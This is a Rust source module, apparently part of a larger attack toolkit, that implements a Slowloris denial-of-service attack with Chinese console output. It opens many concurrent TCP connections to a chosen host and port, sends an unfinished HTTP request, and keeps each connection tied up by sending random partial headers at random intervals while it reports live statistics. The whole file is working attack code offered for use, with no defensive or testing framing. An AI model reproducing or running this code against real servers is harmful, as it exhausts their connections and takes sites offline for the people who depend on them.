use crate::{attacks::{AttackConfig, AttackResult}, stats::StatsArc, utils};
use std::net::TcpStream;
use std::io::Write;
use std::time::{Duration, Instant};
use tokio::time::sleep;
use rand::Rng;

pub async fn run_slowloris_attack(config: AttackConfig, stats: StatsArc) -> AttackResult {
    println!("🐌 Slowloris攻击启动");
    println!("目标: {}:{}", config.target, config.port);
    println!("攻击模式: {}", config.mode);
    println!("并发连接: {}", config.connections);
    println!("持续时间: {}秒", config.duration);
    println!("超时时间: {}秒", config.timeout);
    println!("保持连接: {}", if config.keep_alive { "是" } else { "否" });
    println!("随机头部: {}", if config.random_headers { "是" } else { "否" });
    println!();

    let start_time = Instant::now();
    let duration = Duration::from_secs(config.duration);
    
    // 调整参数
    let adjusted_connections = utils::adjust_connections_by_mode(config.connections, &config.mode, "slowloris");
    let (min_delay, max_delay) = utils::get_delay_by_mode(&config.mode, "slowloris");

    println!("🎯 调整后的参数:");
    println!("实际并发数: {}", adjusted_connections);
    println!("延迟范围: {}ms - {}ms", min_delay, max_delay);
    println!();

    // 创建攻击任务
    let mut tasks = Vec::new();
    for _ in 0..adjusted_connections {
        let target = config.target.clone();
        let port = config.port;
        let stats = stats.clone();
        let duration = duration.clone();
        let random_headers = config.random_headers;
        let min_interval = config.min_interval;
        let max_interval = config.max_interval;

        let task = tokio::spawn(async move {
            let start = Instant::now();
            let mut connection_id = 0;
            
            // 建立初始连接
            let mut stream = match TcpStream::connect(format!("{}:{}", target, port)) {
                Ok(stream) => {
                    let mut stats = stats.lock().unwrap();
                    stats.add_request(true, 0, 0);
                    stream
                }
                Err(_) => {
                    let mut stats = stats.lock().unwrap();
                    stats.add_request(false, 0, 0);
                    return;
                }
            };

            // 发送初始HTTP请求
            let initial_request = format!(
                "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Slowloris\r\nConnection: keep-alive\r\n",
                target
            );
            if let Err(_) = stream.write_all(initial_request.as_bytes()) {
                let mut stats = stats.lock().unwrap();
                stats.add_request(false, 0, 0);
                return;
            }

            while start.elapsed() < duration {
                // 随机延迟
                let interval = rand::thread_rng().gen_range(min_interval..=max_interval);
                sleep(Duration::from_millis(interval)).await;

                // 发送部分HTTP头部
                let partial_header = if random_headers {
                    let header_name = format!("X-{}-Header", utils::generate_random_header_value());
                    format!("{}: {}\r\n", header_name, utils::generate_random_header_value())
                } else {
                    format!("X-{}-Header: {}\r\n", connection_id, rand::thread_rng().gen::<u32>())
                };

                match stream.write_all(partial_header.as_bytes()) {
                    Ok(_) => {
                        let mut stats = stats.lock().unwrap();
                        stats.add_request(true, partial_header.len() as u64, 0);
                    }
                    Err(_) => {
                        let mut stats = stats.lock().unwrap();
                        stats.add_request(false, 0, 0);
                        return;
                    }
                }
                connection_id += 1;
            }
        });
        tasks.push(task);
    }

    // 统计监控任务
    let stats_monitor = stats.clone();
    let monitor_task = tokio::spawn(async move {
        let mut last_stats = crate::stats::Stats::default();
        let mut last_time = Instant::now();
        let start = Instant::now();

        while start.elapsed() < duration {
            sleep(Duration::from_secs(1)).await;
            let current_stats = stats_monitor.lock().unwrap();
            let current_time = Instant::now();
            let time_diff = current_time.duration_since(last_time).as_secs_f64();
            let requests_diff = current_stats.total_requests - last_stats.total_requests;
            let rps = requests_diff as f64 / time_diff;
            let elapsed_seconds = start.elapsed().as_secs();

            println!("⏱️ [{}s] Slowloris RPS: {:.0} | 成功: {} | 失败: {} | 总计: {}", 
                elapsed_seconds,
                rps, 
                current_stats.successful_requests, 
                current_stats.failed_requests, 
                current_stats.total_requests
            );

            last_stats = current_stats.clone();
            last_time = current_time;
        }
    });

    // 进度监控任务
    let progress_task = tokio::spawn(async move {
        let mut elapsed = 0u64;
        while elapsed < config.duration {
            sleep(Duration::from_secs(1)).await;
            elapsed += 1;
            println!("⏳ Slowloris攻击进度: {}/{} 秒", elapsed, config.duration);
        }
        println!("✅ Slowloris攻击完成！");
    });

    // 等待攻击完成
    tokio::select! {
        _ = progress_task => {
            println!("✅ Slowloris攻击完成！");
        }
    }

    // 取消所有任务
    for task in tasks {
        task.abort();
    }
    monitor_task.abort();

    // 生成结果
    let final_stats = stats.lock().unwrap();
    let elapsed = start_time.elapsed();
    AttackResult::new(&final_stats, elapsed)
} 